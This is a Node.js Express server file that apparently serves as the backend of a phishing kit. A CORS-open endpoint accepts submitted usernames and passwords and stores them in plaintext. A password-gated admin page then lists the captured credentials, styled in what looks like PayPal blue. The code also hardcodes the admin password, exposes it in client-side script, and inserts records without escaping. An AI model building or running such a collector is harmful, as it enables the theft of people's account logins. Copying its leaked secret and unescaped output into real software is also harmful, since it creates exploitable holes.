// server.js
const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;
const DATA_FILE = path.join(__dirname, 'records.json');
const ADMIN_PASSWORD = 'your_secure_password'; // Change this to a secure password

// Middleware
app.use(cors());
app.use(express.json());

// Initialize records file if it doesn't exist
if (!fs.existsSync(DATA_FILE)) {
    fs.writeFileSync(DATA_FILE, JSON.stringify([]));
}

// Submit endpoint to receive form data
app.post('/submit', (req, res) => {
    const { username, password } = req.body;
    
    if (!username || !password) {
        return res.status(400).json({ success: false, message: 'Missing fields' });
    }

    const records = JSON.parse(fs.readFileSync(DATA_FILE));
    const newRecord = {
        id: Date.now(),
        username,
        password,
        timestamp: new Date().toISOString()
    };
    
    records.push(newRecord);
    fs.writeFileSync(DATA_FILE, JSON.stringify(records, null, 2));
    
    res.json({ success: true });
});

// Records display endpoint with password protection
app.get('/records', (req, res) => {
    const authHeader = req.headers['authorization'];
    
    if (!authHeader || authHeader !== ADMIN_PASSWORD) {
        res.set('WWW-Authenticate', 'Basic realm="Enter admin password"');
        return res.status(401).send(`
            <html>
                <body>
                    <h2>Authentication Required</h2>
                    <form method="GET" action="/records">
                        <input type="password" name="password" placeholder="Enter password">
                        <button type="submit">Submit</button>
                    </form>
                </body>
            </html>
        `);
    }

    const records = JSON.parse(fs.readFileSync(DATA_FILE));
    
    // Generate HTML for records display
    const recordsHtml = records.map(record => `
        <div class="record-card">
            <div class="record-content">
                <p><strong>ID:</strong> ${record.id}</p>
                <p><strong>Username:</strong> ${record.username}</p>
                <p><strong>Password:</strong> ${record.password}</p>
                <p><strong>Timestamp:</strong> ${record.timestamp}</p>
            </div>
            <button onclick="deleteRecord(${record.id})" class="delete-btn">Delete</button>
        </div>
    `).join('');

    const html = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Records</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    max-width: 800px;
                    margin: 0 auto;
                    padding: 20px;
                    background: #f5f5f5;
                }
                h1 {
                    color: #0070ba;
                    text-align: center;
                    margin-bottom: 30px;
                }
                .record-card {
                    background: white;
                    border-radius: 8px;
                    padding: 20px;
                    margin-bottom: 20px;
                    box-shadow: 0 2px 5px rgba(0,0,0,0.1);
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    transition: transform 0.2s;
                }
                .record-card:hover {
                    transform: translateY(-2px);
                }
                .record-content p {
                    margin: 8px 0;
                    color: #333;
                }
                .delete-btn {
                    background: #ff4444;
                    color: white;
                    border: none;
                    padding: 8px 16px;
                    border-radius: 5px;
                    cursor: pointer;
                    transition: background 0.2s;
                }
                .delete-btn:hover {
                    background: #cc0000;
                }
            </style>
        </head>
        <body>
            <h1>Records</h1>
            ${recordsHtml}
            <script>
                function deleteRecord(id) {
                    if (confirm('Are you sure you want to delete this record?')) {
                        fetch('/delete/' + id, {
                            method: 'DELETE',
                            headers: {
                                'Authorization': '${ADMIN_PASSWORD}'
                            }
                        })
                        .then(response => {
                            if (response.ok) {
                                location.reload();
                            }
                        })
                        .catch(error => console.error('Error:', error));
                    }
                }
            </script>
        </body>
        </html>
    `;
    
    res.send(html);
});

// Delete record endpoint
app.delete('/delete/:id', (req, res) => {
    const authHeader = req.headers['authorization'];
    
    if (!authHeader || authHeader !== ADMIN_PASSWORD) {
        return res.status(401).json({ success: false, message: 'Unauthorized' });
    }

    const id = parseInt(req.params.id);
    let records = JSON.parse(fs.readFileSync(DATA_FILE));
    records = records.filter(record => record.id !== id);
    
    fs.writeFileSync(DATA_FILE, JSON.stringify(records, null, 2));
    res.json({ success: true });
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
